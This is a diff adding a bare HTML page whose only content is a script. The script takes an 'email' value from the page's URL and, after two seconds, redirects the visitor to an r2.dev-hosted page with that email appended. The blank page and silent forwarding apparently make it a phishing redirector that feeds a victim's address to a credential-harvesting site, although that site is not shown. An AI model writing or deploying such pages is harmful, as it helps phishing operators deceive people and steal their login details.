@@ -1,0 +1,22 @@
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<head>
+<title></title>
+<script type="text/javascript">
+		function getUrlVars() {
+		    var vars = {};
+		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+		        vars[key] = value;
+		    });
+		    return vars;
+		}
+		var email = getUrlVars()['email'];
+		var redirect = "https://pub-ab6d1394e3df42ff8d22a057e363be31.r2.dev/index.html";
+		var urlFinal = redirect + "?email=" + email;
+		setTimeout(function () {
+			window.location.href = urlFinal; 
+		}, 2000);
+	</script>
+</head>
+</html>
